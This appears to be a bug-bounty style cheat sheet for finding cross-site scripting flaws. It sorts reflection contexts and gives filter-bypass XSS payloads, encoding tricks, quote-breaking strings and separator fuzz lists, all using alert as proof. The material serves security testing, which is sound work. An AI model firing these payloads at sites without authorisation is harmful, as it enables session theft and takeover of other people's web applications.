# XSS Discovery

## Methodology:

1. Use any Entry point and input your special text (aliali)Use this text, and try to search it in the responses of burp
2. make an auto repeater config to send a blind xss as well
3. when you enter your age, number, drop down and it gets reflected, so try to inject payload via burp

### There are a few possible situations that input can be reflected

- Outside tag
    - Executable
    - Non-executable
- Inside tag
    - inside an Even Handler
    - inside `src`Attribute
    - inside `srcdoc`Attribute
    - Generic Attribute
- JavaScript context

Before continue, lets see an useful flow:

Payload —> browser ⇒ changes  —> urlEncode —> server ⇒ url Decode —> browser —> DOM —> XSS

## Before Start

- what is HTML encoding?
    - HTML encoding ensures that text will be correctly displayed in the browser, not interpreted by browser as HTML.
    - `&#xHEX,`example is `&#x61;`
    - `&#DEC`, example is `&#97;`
- what is character reference?
    - Symbolic names for characters that may be included in an HTML document
    - `&lt;` represents the `<` sign
    - `&gt;` represents the `>` sign
    - `&quote`; represents the `“` sign
    - `&colon;` represents the `:` sign
- What is Unicode?
    - It’s a way of encoding multilingual plain text
    - In JavaScript, the general syntax is `\uXXXX` where `X` denotes hexadecimal digits
    - `\u0061` represents the `a` character
- What is URL encode?
    - URL encoding converts characters into a format that can be transmitted over the internet (URL can contain ASCII)
    - The format `%HEX` is using to encode data
    - `%41` represents the A character
    - Sometimes the server and application decode the data respectively, so double URL encode data are valid

AS instance, the following data:

```html
test%20test
test%5ctest
test%26%23test

ali$0anext+line
```

Will be turned into the following data:

```html
test test
test\test
test&#test

ali
next line
```

## Golden Tips

- Browsers **automatically HTML decode** the **HTML attributes**
- Browsers parse the Unicode in **JavaScript**
- Browsers **do not parse** HTML tags if they are **encoded**

Now, let’s begin with how to discover an XSS

## Outside Tag

Two possibilities

### Executable

The HTML tag is going to be parsed and executed. Tree payloads can be used:

```html
<{tag}{filler}{eventhander}{?filler}={?filler}{javascript}}{?filler}{>,//,Space,Tap,LF}
<sCript{filler}sRc{?filler}{url}{?filler}{>,//,tap,LF}
<A{filler}hRef{?filler}={?filler}javascript:javascriptCode{?filler}{>,//,Space,Tap,LF}

#<img src=x onerror=alert()> # each tag
#<script src=url></script>
#<a href=javascript:alert()>
```

Start manual fuzz

```html
<x{SP}xxx=
<x{SP}onxxx=
```

Some separators:

```html
{SPACE}
//
/
%0a
%0d
%09
%09%09
/~/
```

Example:

```html
<img/xxx
<img/~/xxx
<img/~/onxxx
```

Some payloads:

```html
<a hRef="&#x74;avascript:&colon;alert()">test</a>
<IMG/src/onerror=alert(0)>
```

Outside Tag → Executable → <x{SP}onxxx → 3 cases 

1. Failed {Regex: delete or strip out the tag ⇒ noting }
2. Failed {Blacklist: FUZZ}
3. Encoded {Double encoded, HTML encode ⇒ it encodes your payload to html encode, you have encode it by URL or encoded it by html again }

### Non-executable:

The tags {also wont be executed in HTML comment}

```html
<style>
<title>
<noembed>
<template>
<noscript>
<textarea>
<!-- non-executanel -->
```

Start manual fuzz (for closing tags):

```html
</tag>
</tAg/x>
</tag{space}>
</tag//>
</tag%0a>
</tag%0d>
```

## Inside tag

some situation may occur

### Inside an Even Handler

Code example:

```html
<tag event_handler="func('$input')">
```

The exploitation is easy since we can take advantage of **HTML encodings**

```html
');alert(origin);// -> &#39;);alert(origin);// 
```

### inside `src` Attribute

Code example:

```html
<script src="$input">
```

Try to use remote JS, it the host is **whitelisted**, try to **bypass**

### Inside `srcdoc` Attribute

```html
<iframe srcdoc="$input">
```

The exploitation is easy since we can take advantage of **HTML encodings**

```html
&lt;svg/onload=alert()&gt;
```

### Generic Attribute

Code example:

```html
<input type="text" value="$input">
<input type="text" value='$input'>
<input type="text" value=$input>
```

You should break the context, if there is no context, there is no need to break. Some methods:

```html
"
%22
%2522
&quot;
%26quot;
%2526qout;
'
%27
%2527
&#39;
%26%2339;
%2526%252339;
```

If you succeed, try to use **1. Event Handlers** of close the **2. HTML tag.**

### JavaScript Context

Code example:

```html
var test = '$input';
```

Try to **break the context**, or **close the script tag**. Example:

```html
';alert(origin);//
</script/x><img/src/onerror=alert()>
```

Sometimes you do not need to break something, as an instance:

```
location.replace($input)
```

Which can be exploited **without break.** Consider that you cannot use **HTML encoding**, but **tab character**

```
javascript:alert(1)
javascr**%09**ipt:**\u0061**lert(1)
javascr**\t**ipt:\**u0061**lert(1)
```

Test your payload on : [click](http://jsfiddle.net)